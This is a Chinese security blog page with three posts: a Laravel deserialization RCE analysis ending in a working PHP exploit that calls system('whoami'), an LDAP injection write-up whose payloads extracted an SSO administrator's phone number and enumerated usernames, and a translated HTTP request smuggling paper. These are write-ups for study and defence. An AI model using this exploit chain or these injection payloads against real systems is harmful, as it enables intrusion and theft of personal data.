<p>步入执行dispatch函数，跳转到<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>的call方法<br><img src="http://static.zybuluo.com/1160307775/7mscxmikz6sh3m5vm6n71aga/image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png" alt="image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png-347.9kB"></p>
<p>跟进format函数如下图，发现此时的$arguments为可控值即我们序列化传入的$this-&gt;event<br><img src="http://static.zybuluo.com/1160307775/b913247o6m4bapk67pg329k8/image_1dhohhel0113lp9j14iq1o7g1deg4b.png" alt="image_1dhohhel0113lp9j14iq1o7g1deg4b.png-436.8kB"></p>
<p>继续步入看看getFormatter函数的具体实现</p>
<pre><code>public function getFormatter($formatter) # formatter  = dispatch
{
    if (isset($this-&gt;formatters[$formatter])) { # formatters可控
        return $this-&gt;formatters[$formatter];
    }
    foreach ($this-&gt;providers as $provider) {
        if (method_exists($provider, $formatter)) {
            $this-&gt;formatters[$formatter] = array($provider, $formatter);

            return $this-&gt;formatters[$formatter];
        }
    }
    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
}</code></pre><p>判断formatters[formatter]存在即返回，然而formatters也是我们可控的，那就能返回任意函数名了。即call_user_func_arrary的函数名和函数值都可控，rce实现～<br><img src="http://static.zybuluo.com/1160307775/n5f8fm6zdtweygg047xhitdb/image_1dhoj1sdkbh3110j1vmq123efuf65.png" alt="image_1dhoj1sdkbh3110j1vmq123efuf65.png-95.9kB"></p>
<h1 id="Dispatcher处存在任意函数调用"><a href="#Dispatcher处存在任意函数调用" class="headerlink" title="Dispatcher处存在任意函数调用"></a>Dispatcher处存在任意函数调用</h1><p>首先还是看一下造成漏洞的点在<code>vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</code>，允许我们使用<code>call_user_func</code>进行任意函数调用，且参数可控。<br><img src="http://static.zybuluo.com/1160307775/ceenl8t6uw3aipnvsc9x93p8/image_1dhnv8s401hhqdai12u51uqgia1p.png" alt="image_1dhnv8s401hhqdai12u51uqgia1p.png-110.2kB"></p>
<p>接着我们从源头追pop。入口方法依然在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code>中，__destrcut执行dispatch函数<br><img src="http://static.zybuluo.com/1160307775/pdv4vp3nt9no1k94wb5jujkc/image_1dhnvcu1b1koj1f5o3oh9e1blr16.png" alt="image_1dhnvcu1b1koj1f5o3oh9e1blr16.png-108.5kB"></p>
<p>这次全局搜索哪些类存在dispatch函数，正好dispatcher本身中就存在，而且调用到了漏洞触发函数<code>dispatchToQueue</code>去执行<code>call_user_func</code></p>
<p><img src="http://static.zybuluo.com/1160307775/3vrpkiph81avi6cc2187ao5l/image_1dhnvi8t69udppb8bdhpo1sq11j.png" alt="image_1dhnvi8t69udppb8bdhpo1sq11j.png-167.8kB"></p>
<p>这里首先进行了如下条件判断</p>
<pre><code>$this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</code></pre><p>跟进<code>commandShouldBeQueued</code>发现command参数必须是继承自    <code>ShouldQueue</code>接口的对象才能进入判断，这点我们可以通过序列化控制$command为对象。<br><img src="http://static.zybuluo.com/1160307775/9szugjpwpov3c0v9bj9r5so6/image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png" alt="image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png-34.1kB"></p>
<p>只需要全局搜一下哪个类实现了<code>ShouldQueue</code>接口，这里使用<code>BroadcastEvent</code><br><img src="http://static.zybuluo.com/1160307775/7b6akvknkvytxn922rfymihj/image_1dho0anindq2h3e12jnoj3vl23t.png" alt="image_1dho0anindq2h3e12jnoj3vl23t.png-228.8kB"></p>
<p>判断走通回到dispather，进行函数<code>dispatchToQueue</code>调用，<code>$connection</code>参数取自<code>$command</code>的connection属性<br><img src="http://static.zybuluo.com/1160307775/er9kg4fp6hp4rdcgorvkjfut/image_1dho0e2svl3kjdg166r1qv61cae4a.png" alt="image_1dho0e2svl3kjdg166r1qv61cae4a.png-137.1kB"></p>
<p>但是<code>BroadcastEvent</code>没有connection属性。不过没有关系，我们自己序列化可以给类添加任何想要的属性。因为反序列化的时候不执行该类__contrust，自然也不会在<code>BroadcastEvent</code>中报错。</p>
<p>流程就这么简单，构造每个类的属性，让条件走通就行了。构造的exp</p>
<pre><code>&lt;?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this-&gt;connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this-&gt;queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent(&quot;whoami&quot;);

    $dispater = new Illuminate\Bus\Dispatcher(&quot;system&quot;);

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);

    echo urlencode(serialize($PendingBroadcast));

}</code></pre><p>只不过是没有回显，需要我们可以外带出去，这里调试的结果成功执行system获取whoami为hpdoger<br><img src="http://static.zybuluo.com/1160307775/72f5906tt0oafrk68hj4q2yl/image_1dho0phn5uka1c5316dv1g8n1ckr4n.png" alt="image_1dho0phn5uka1c5316dv1g8n1ckr4n.png-351.9kB"></p>

                
            </div>
            <div class="continue">
            <a href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/08/13/从一次漏洞挖掘入门ldap注入/"> 
                    从一次漏洞挖掘入门ldap注入 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-08-13   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从一次漏洞挖掘入门ldap注入"><a href="#从一次漏洞挖掘入门ldap注入" class="headerlink" title="从一次漏洞挖掘入门ldap注入"></a>从一次漏洞挖掘入门ldap注入</h1><p>原文首发于先知:<a href="https://xz.aliyun.com/t/5689" target="_blank" rel="noopener">https://xz.aliyun.com/t/5689</a></p>
<p>在最近的一次测试中，随缘摸到了一个sso系统，留给前台的功能只有登陆。</p>
<p>没有验证码，但是登陆点强制要求每个用户更改强密码，而且除了管理员和测试账号其他大部分都是工号形式，所以不考虑撞库。直接fuzz一把梭</p>
<p>测试过程中发现username对于下面payload会存在两种不同回显<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d1fa1ac-a78a-1.png" alt="image_1dfitlu921a2l2qg1qlf1ulrpaom.png-64.6kB"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d715baa-a78a-1.png" alt="image_1dfito82tqcipm01gsb8vt87g13.png-70.4kB"></p>
<p>当时我并不理解这种payload是什么库的数据格式。但是看到存在”!”字符时，页面的回显是不同的，而”!”在绝大多数语言中都是取反的表达形式，自然会产生不同的布尔值，那么无疑就是个xxx注入点了</p>
<h1 id="何为LDAP"><a href="#何为LDAP" class="headerlink" title="何为LDAP"></a>何为LDAP</h1><p>通过payload的类型，看到是经典的ldap注入语句。一种老协议和数据存储形式了</p>
<h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p>LDAP(Lightweight Directory Access Protocol):即轻量级目录访问协议。是一种运行于TCP/IP之上的在线目录访问协议，主要用于目录中资源的搜索和查询。使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP</p>
<h2 id="LDAP存储"><a href="#LDAP存储" class="headerlink" title="LDAP存储"></a>LDAP存储</h2><p>MySQL数据库，数据都是按记录一条条记录存在表中。而LDAP数据库，是树结构的，数据存储在叶子节点上。</p>
<p>LDAP目录中的信息是按照树形结构组织的:</p>
<pre><code>dn:一条记录的位置
dc:一条记录所属的区域
ou:一条记录所属的组织
cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数据的查询。首先要说明是哪一棵树(dc)，然后是从树根到目标所经过的所有分叉(ou)，最后就是目标的名字(cn/uid)，借用一张图来表明结构如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4db2fcb8-a78a-1.png" alt="image_1dfivc13p1s9a19421h52facl6120.png-74.2kB"></p>
<h2 id="条目-amp-对象类-amp-属性"><a href="#条目-amp-对象类-amp-属性" class="headerlink" title="条目&amp;对象类&amp;属性"></a>条目&amp;对象类&amp;属性</h2><ul>
<li><p>条目(entry):是目录中存储的基本信息单元，上图每一个方框代表一个entry。一个entry有若干个属性和若干个值，有些entry还能包含子entry</p>
</li>
<li><p>对象类(obejectclass):对象类封装了可选/必选<strong>属性</strong>，同时对象类也是支持继承的。一个entry必须包含一个objectClass，且需要赋予至少一个值。而且objectClass有着严格的等级之分，最顶层是top和alias。例如，organizationalPerson这个objectClass就隶属于person，而person又隶属于top<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4df19b8a-a78a-1.png" alt="image_1dfj1uep3pjh32v1bbe1oop16jk2d.png-11.8kB"></p>
</li>
<li><p>属性(atrribute):顾名思义，用来存储字段值。被封装在objectclass里的，每个属性(attribute)也会分配唯一的OID号码</p>
</li>
</ul>
<h2 id="LDAP查询语句"><a href="#LDAP查询语句" class="headerlink" title="LDAP查询语句"></a>LDAP查询语句</h2><p>一个圆括号内的判断语句又称为一个过滤器filter。</p>
<pre><code>( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</code></pre><h3 id="逻辑与-amp"><a href="#逻辑与-amp" class="headerlink" title="逻辑与&amp;"></a>逻辑与&amp;</h3><pre><code>(&amp;(username=Hpdoger)(password=ikun))</code></pre><p>查找name属性为Hpdoger并且password属性值为ikun的所有条目</p>
<h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或|"></a>逻辑或|</h3><pre><code>(|(username=Hpdoger)(displayname=Hpdoger))</code></pre><p>查找username或者displayname为Hpdoger的所有条目</p>
<h3 id="特殊说明"><a href="#特殊说明" class="headerlink" title="特殊说明"></a>特殊说明</h3><p>除使用逻辑操作符外，还允许使用下面的单独符号作为两个特殊常量</p>
<pre><code>(&amp;)     -&gt;Absolute TRUE 
(|)     -&gt;Absolute FALSE 
*       -&gt;通配符</code></pre><p>另外，默认情况下，LDAP的DN和所有属性都不区分大小写，即在查询时：</p>
<pre><code>(username=Hpdoger) &lt;=&gt; (username=HPDOGER)</code></pre><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>由于LDAP的出现可以追溯到1980年，关于它的漏洞也是历史悠久。LDAP注入攻击和SQL注入攻击相似，利用用户引入的参数生成LDAP查询。攻击者构造恶意的查询语句读取其它数据/跨objectclass读取属性，早在wooyun时代就有师傅详细的剖析了这类漏洞。</p>
<p>上文说到LDAP过滤器的结构和使用得最广泛的LDAP：ADAM和OpenLDAP。然而对于下面两种情况</p>
<h2 id="无逻辑操作符的注入"><a href="#无逻辑操作符的注入" class="headerlink" title="无逻辑操作符的注入"></a>无逻辑操作符的注入</h2><p>情景：<code>(attribute=$input)</code></p>
<p>我们构造输入:<code>$input=value)(injected_filter</code></p>
<p>代入查询的完整语句就为:</p>
<pre><code>(attribute=value)(injected_filter)</code></pre><p>由于一个括号内代表一个过滤器，在OpenLDAP实施中，第二个过滤器会被忽略，只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的。</p>
<p>因而这类情况仅对于OpenLDAP有一定的影响。</p>
<p>例如我们要想查询一个字段是否存在某值时，可以用<code>$input=x*</code>进行推移，利用页面响应不同判断x*是否查询成功</p>
<h2 id="带有逻辑操作符的注入"><a href="#带有逻辑操作符的注入" class="headerlink" title="带有逻辑操作符的注入"></a>带有逻辑操作符的注入</h2><pre><code>(|(attribute=$input)(second_filter))
(&amp;(attribute=$input)(second_filter))</code></pre><p>此时带有逻辑操作符的括号相当于一个过滤器。此时形如value)(injected_filter)的注入会变成如下过滤器结构</p>
<pre><code>(&amp;(attribute=value)(injected_filter))(second_filter)</code></pre><p>虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p>
<p>举个最简单的登陆注入的例子，如果验证登陆的查询语句是这样:</p>
<pre><code>(&amp;(USER=$username)(PASSWORD=$pwd)) </code></pre><p>输入$username = <code>admin)(&amp;)(</code>使查询语句变为</p>
<pre><code>(&amp;(USER=admin)(&amp;))((PASSWORD=$pwd)) </code></pre><p>即可让后面的password过滤器失效，执行第一个过滤器而返回true，达到万能密码的效果。</p>
<h2 id="后注入分析"><a href="#后注入分析" class="headerlink" title="后注入分析"></a>后注入分析</h2><p>注入大致分为and、or类型这里就不赘述，感兴趣的可以看之前wooyun的文章：<br><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p>
<p>还有一个joomla的一个userPassword注入实例:<br><a href="https://www.anquanke.com/post/id/86899" target="_blank" rel="noopener">Joomla! LDAP注入导致登录认证绕过漏洞</a></p>
<h1 id="回到实例"><a href="#回到实例" class="headerlink" title="回到实例"></a>回到实例</h1><p>大致了解注入类型，就开始了第一轮尝试</p>
<p>当通配符匹配到用户名时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132647-4e7d6dae-a78a-1.png" alt="image_1dfj9gu7f1d261ad2o9jao3q082q.png-40.1kB"></p>
<p>用户名不存在时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ecb7d3c-a78a-1.png" alt="image_1dfj9iml33968bod9etnogsu3n.png-49.7kB"></p>
<p>构造用户名恒真<code>username=admin)(%26&amp;password=123</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ee14e8c-a78a-1.png" alt="image_1dfj9mj071drl59b37j21teu544.png-49.7kB"></p>
<p>说明它判断用户的形式并不是<code>(&amp;(USER=$username)(PASSWORD=$pwd))</code>，因为我们查到的用户名是true，但是验证密码false</p>
<p>由于自己也没搞过LDAP的开发..就盲猜后端应该就是这种情况:<br>执行了<code>(&amp;(USER=$username)(objectclass=xxx))</code>后，取password与$password进行对比</p>
<h2 id="ACTION"><a href="#ACTION" class="headerlink" title="ACTION"></a>ACTION</h2><p>那么首先要知道它继承了哪些objectclass？因为树结构都有根，使我们能顺藤摸瓜。首先是top肯定存在，回显如下:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4f4b148e-a78a-1.png" alt="image_1dfje9v39cu01n95u4fqln1ed9.png-36.9kB"></p>
<p>但是top的子类太多了，先fuzz一下objectclass的值缩小范围，payload：</p>
<pre><code>username=admin)(objectclass%3d$str</code></pre><p>发现存在<strong>person</strong>和<strong>user</strong>两个objectclass</p>
<p>再fuzz一下attribute得到的值如下:</p>
<pre><code>username=admin)($str%3d*</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-4ff6ba6e-a78a-1.png" alt="image_1dfjehfm71qa71ri11b481mj9183m.png-80.2kB"></p>
<p>凭借这些信息去LDAP文档里溯继承链，先去找user类，继承自organizationalPerson<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-5033cd5a-a78a-1.png" alt="image_1dfjeub3c1dfvnb5dv6k61i7l13.png-67.3kB"></p>
<p>同理organizationalperson又是继承自person的，person继承自top，最终的继承链为：</p>
<pre><code>top-&gt;person-&gt;organizationalperson-&gt;user</code></pre><p>也就是说这些类存在的属性都可能被调用。很遗憾的是我并没有fuzz到password类型参数，一般来说password会以userPassword的形式存储在person对象中，很多基于ldap的开发demo中也是这样写的。</p>
<p>但是userPassword毕竟也只是person类可选的属性，开发大概率是改名或者重写属性了，这也是这个漏洞没有上升到严重危害的瓶颈点<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-50554700-a78a-1.png" alt="image_1dfki06dp1sqm147onc11odt3at13.png-127.9kB"></p>
<p>不过依然可以注出一些有用的数据。例如所有用户的用户名、邮箱、手机号、姓名、性别等等，说不定以后可以越权修改某账号性别呢-3-</p>
<h3 id="盲注mobile"><a href="#盲注mobile" class="headerlink" title="盲注mobile"></a>盲注mobile</h3><p>尝试注入管理员的手机号mobile</p>
<pre><code>username=admin)(mobile=%s*&amp;password=123</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50b0e8f8-a78a-1.png" alt="image_1dfkgoopj19s4kkkq0sulvmp4m.png-52.6kB"></p>
<p>利用通配符不断添加数字，同理邮箱也可以注出来，与sql盲注的思路相同。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50c968d8-a78a-1.png" alt="image_1dfl7ap4k1pna18bk17ec24166o2n.png-42.3kB"></p>
<h3 id="盲注username"><a href="#盲注username" class="headerlink" title="盲注username"></a>盲注username</h3><p>毕竟对于sso，收集username是很有用的信息。那么问题来了，我们是可以通过生成字典来遍历存在的用户名，但是这个工作量是指数倍的增长，一天能跑完一个字母开头的就不错了，而且浪费了通配符的作用。</p>
<p>可是又想做到无限迭代把所有用户一个不漏的跑完，passer6y师傅提醒我用笛卡尔积</p>
<p>最后画出来的流程图大致如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-512168da-a78a-1.png" alt="image_1dfkks6d86j6ra51m7821d3831g.png-87.6kB"></p>
<p>最后测试用户大概有1w多，然而这些大部分是测试帐号，未授权的情况下也不能跑具体数据，但也算是验证了思路的可执行性。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>网上关于这类漏洞的fuzz思路也比较久远了，第一次接触这种漏洞，若文章思路如果有什么不对的地方还请师傅们斧正。自己对这类漏洞的姿势理解很浅，现在漏洞已经修复，但是如果有师傅对于password的注入有想法，可以私下交流一下</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</a><br><a href="https://www.cnblogs.com/pycode/p/9495808.html" target="_blank" rel="noopener">https://www.cnblogs.com/pycode/p/9495808.html</a><br><a href="https://zhuanlan.zhihu.com/p/32732045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32732045</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/08/13/从一次漏洞挖掘入门ldap注入/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/08/10/HTTP Desync Attacks-Smashing into the Cell Next Door/"> 
                    HTTP Desync Attacks-Smashing into the Cell Next Door 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-08-10   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door"><a href="#HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door" class="headerlink" title="HTTP Desync Attacks-Smashing into the Cell Next Door"></a>HTTP Desync Attacks-Smashing into the Cell Next Door</h1><p>文章转载议题:<a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153(相关文章资源放到文章结尾)" target="_blank" rel="noopener">https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153(相关文章资源放到文章结尾)</a></p>
<p>James Kettle - <a href="mailto:james.kettle@portswigger.net" target="_blank" rel="noopener">james.kettle@portswigger.net</a> - @albinowax</p>
<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>传统上，HTTP请求被视为独立的独立实体。在本文中，我将探讨一种远程、未经身份验证的攻击者能够打破这种隔离并将其请求转接到其他人身上的技术。通过这种技术，我可以在众多商业和军事系统的WEB基础应用上扮演一位操作者，在他们的虚拟环境中使用漏洞，并且在bug bounties中获得超过6万美元</p>
<p>将这些目标作为案例研究，我将向您展示如何巧妙地修改受害者的请求，以将其路由到恶意领域，调用有害的响应。我还将演示在您自己的请求中使用后端重组，攻击基于前端的各种信任，获得对内部API的最大特权访问，投毒Web缓存，并危及paypal的登录页面。</p>
<p>HTTP Request Smuggling(后文称为请求走私)最初是由WatchFire1于2005年记录下来的，但由于其困难和附带损害的可怕名声，使得当Web服务的敏感性增常期间，它大多被忽视。除了新的攻击变种和利用途径之外，我将帮助您使用定制的开源工具和一种改进的方法来处理这一遗留问题，以最小的风险进行可靠的黑盒检测、评估和利用</p>
<h2 id="Core-concepts"><a href="#Core-concepts" class="headerlink" title="Core concepts"></a>Core concepts</h2><p>自HTTP/1.1以来，通过一个底层TCP或SSL/TLS套接字发送多个HTTP请求被广泛支持。这个协议非常简单——HTTP请求只需背靠背地放置，服务器解析报头就可以知道每个报头的结束位置和下一个报头的开始位置。这经常与HTTP pipeline2混淆，后者是少见的类型，在本文的攻击描述中不予介绍。</p>
<p>这本身是无害的。然而，现代网站是由一系列的系统组成的，都是通过HTTP进行对话的。此多层体系结构接收来自多个不同用户的HTTP请求，并通过单个TCP/TLS连接将其路由：<br><img src="http://static.zybuluo.com/1160307775/5zcoyljdq16xzvsz5wbnna62/image_1dhtfhnrdqvspfo15j4no1tuqp.png" alt="image_1dhtfhnrdqvspfo15j4no1tuqp.png-22.8kB"></p>
<p>这意味着，后端与前端关于“每条消息在哪里结束”达成一致是至关重要的。否则，攻击者可能会发送一条不明确的消息，使后端将其解释为两个不同的HTTP请求</p>
<p><img src="http://static.zybuluo.com/1160307775/ornlfq2wbqh1jf5r7dzed55y/image_1dhtfsok51vkp1c6g7rb1sku1gnm1m.png" alt="image_1dhtfsok51vkp1c6g7rb1sku1gnm1m.png-26kB"></p>
<p>这使攻击者能够在下一个合法用户请求开始时预先处理任意内容。在本文中，走私内容将被称为“前缀”，并以橙色突出显示。</p>
<p>让我们假设前端浏览器优先处理第一个内容长度头，后端优先处理第二个内容长度头。从后端的角度来看，TCP流可能看起来像：</p>
<p><img src="http://static.zybuluo.com/1160307775/m2v46k8ligt8vtjxbvzvcdck/image_1dhtg6sgu16rlhn09bi1779smo3q.png" alt="image_1dhtg6sgu16rlhn09bi1779smo3q.png-21.7kB"></p>
<p>在引擎中，前端浏览器将蓝色和橙色数据转发到后端，后端在发出响应之前只读取蓝色内容。这使得后端套接字受到橙色数据的污染。当合法的绿色请求到达时，它最终附加到橙色内容上，导致意外的响应。</p>
<p>在这个例子中，注入的“G”会破坏绿色用户的请求，他们可能会得到“未知方法GPOST”的响应。</p>
<p>本文中的每个攻击都遵循这个基本格式。WatchFire论文描述了一种称为“反向请求走私”的替代方法，但这依赖于前端和后端系统之间的管道连接，因此很少有选择。</p>
<p>在现实生活中，双content-length技术很少起作用，因为许多系统明智地拒绝具有多个内容长度头的请求。相反，我们将使用分块编码攻击系统-这次我们利用RFC2616规范：</p>
<p><strong>如果接收的消息同时包含传输编码头字段和内容长度头字段，则必须忽略后者</strong></p>
<p>由于规范默许使用传输编码（分块编码和内容长度）处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，从一个服务器上将传输编码头隐藏在一个链中的时，它将返回到使用内容长度，并且我们可以取消整个系统的同步。</p>
<p>您可能不太熟悉分块编码，因为像Burp Suite这样的工具会自动将分块的请求/响应缓冲到常规消息中，以便于编辑。在分块的消息中，正文由0个或多个分块组成。每个块由块大小、换行符和块内容组成。消息以0大小的块终止。以下是使用分块编码进行的简单失步攻击：</p>
<p><img src="http://static.zybuluo.com/1160307775/re8piqva834m983ljgcg4sh9/image_1dhthci68dal13houlsiv8brk47.png" alt="image_1dhthci68dal13houlsiv8brk47.png-22.3kB"></p>
<p>我们没有在这里隐藏传输编码头，因此此漏洞主要适用于前端根本不支持分块编码的系统，这在使用内容交付网络Akamai的许多网站上都可以看到。</p>
<p>如果后端不支持分块编码，我们需要翻转偏移量：<br><img src="http://static.zybuluo.com/1160307775/41818gek0g1258ed5ud1uz9d/image_1dhthmclj6hn11mehtq1ko2ikn4k.png" alt="image_1dhthmclj6hn11mehtq1ko2ikn4k.png-24.6kB"></p>
<p>这种技术在相当多的系统上都起作用，但是我们可以通过使传输编码头稍微难以被发现来利用更多的资源，这样一个系统就看不到它。这可以通过使用服务器的HTTP解析中的差异来实现。下面是一些只有部分服务识别传输编码的请求示例：分块头。在本研究中，每个都成功地用于攻破至少一个系统：</p>
<p><img src="http://static.zybuluo.com/1160307775/qzi15zyia3alxga9sragpspx/image_1dhtj1skk1mim1naa1l2a1toq1ig051.png" alt="image_1dhtj1skk1mim1naa1l2a1toq1ig051.png-52kB"></p>
<p>如果前端和后端服务器都有这些处理，那么每个处理都是无害的，否则都是一个重大威胁。有关更多技术，请查看Regilero正在进行的research4.。我们稍后将使用其他技术查看实际示例。</p>
<h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>请求走私背后的理论是直截了当的，但是不受控制变量的数量和我们对前端所发生事情的完全不了解会导致复杂的情况。</p>
<p>我已经开发了应对这些挑战的技术和工具，并将它们组合成以下简单的方法，我们可以利用这些方法来追查请求的走私漏洞并证明其影响：<br><img src="http://static.zybuluo.com/1160307775/4avwsjuodz5s97mcmuq4ql8c/image_1dhtjaght12mlo3grs1q0rtko5e.png" alt="image_1dhtjaght12mlo3grs1q0rtko5e.png-19.7kB"></p>
<h2 id="Detect"><a href="#Detect" class="headerlink" title="Detect"></a>Detect</h2><p>检测请求走私漏洞的明显方法是发出一个含糊不清的请求，然后发出一个正常的“受害者”请求，然后观察后者是否得到意外的响应。但是，这极易受到干扰；如果另一个用户的请求在受害者请求之前击中中毒的套接字，那么他们将得到损坏的响应，我们将不会发现该漏洞。这意味着，在流量很大的网站，如果不在过程中利用大量用户去测试，就很难证明存在<strong>请求走私</strong>漏洞。即使在没有其他流量的站点上，您也会面临应用程序级异常终止连接所导致的错误否定的风险。</p>
<p>为了解决这个问题，我开发了一种检测策略，它使用一系列消息，使得易受攻击的后端系统挂起并超时连接。这种技术几乎没有误报，可以抵抗应用程序级的行为从而导致的误报，最重要的是，它几乎没有影响其他用户的风险。</p>
<p>假设前端服务器使用Content-Length头，后端使用Transfer-Encoding头。我简称这个目标为cl.te。我们可以通过发送以下请求来检测潜在的请求走私：</p>
<p><img src="http://static.zybuluo.com/1160307775/15im6vs0brbtf61gd6zm1jv6/image_1dhtjsm7t4jo1tun14v4a174ri5r.png" alt="image_1dhtjsm7t4jo1tun14v4a174ri5r.png-17.5kB"></p>
<p>由于内容长度较短，前端将只转发蓝色文本，后端将在等待下一个块大小时超时。这将导致可观察到的时间延迟。</p>
<p>如果两个服务器都是同步的（te.te或cl.cl），则前端将拒绝该请求，或者两个系统都将无害地处理该请求。最后，如果从另一个角度（te.cl）执行去同步，由于块大小“q”无效，前端将拒绝消息而不将其转发到后端。这可以防止后端套接字中毒。</p>
<p>我们可以使用以下请求安全地检测te.cl去同步：<br><img src="http://static.zybuluo.com/1160307775/fvkyn0yeyjzy0pff2in1qg4u/image_1dhtk3jth1s2k11e51o9h15291qqh68.png" alt="image_1dhtk3jth1s2k11e51o9h15291qqh68.png-17.4kB"></p>
<p>由于“0”分块的终止，前端将只转发蓝色文本，后端将超时等待X到达。</p>
<p>如果Desync以另一种方式发生（cl.te），那么这种方法将使用”X”毒害后端套接字，可能会危害合法用户。幸运的是，通过始终运行首先检测方法，我们可以排除这种可能性。</p>
<p>这些请求可以针对头解析中的任意差异进行调整，并用于通过取消Desynchronize5自动识别请求走私漏洞-一个开发用于帮助此类攻击的开源Burp Suite 扩展。它们现在也用于Burp Suite的scanner。尽管这是一个服务器级的漏洞，但单个域上的不同端点通常路由到不同的目标，因此该技术应单独应用于每个端点。</p>
<h2 id="Confirm"><a href="#Confirm" class="headerlink" title="Confirm"></a>Confirm</h2><p>在这一点上，您已经尽了最大努力，而不会给其他用户带来副作用的风险。然而，许多客户不愿意在没有进一步证据的情况下认真对待报告，所以这就是我们将要克服的。证明请求走私的全部危害的下一步是证明后端套接字中毒是可能的。为此，我们将发出一个旨在毒害后端套接字的请求，然后发出一个希望成为毒害受害者的请求，明显地改变了响应。</p>
<p>如果第一个请求导致错误，后端服务器可能会决定关闭连接，丢弃中毒缓冲区并破坏攻击。尝试通过将设计用于接受POST请求的端点作为目标，并保留任何预期的GET/POST参数来避免这种情况。</p>
<p>有些站点有多个不同的后端系统，前端查看每个请求的方法、URL和头，以决定将其路由到何处。如果受害者请求路由到与攻击请求不同的后端，那么攻击将失败。因此，“攻击”和“受害者”请求最初应尽可能相似。</p>
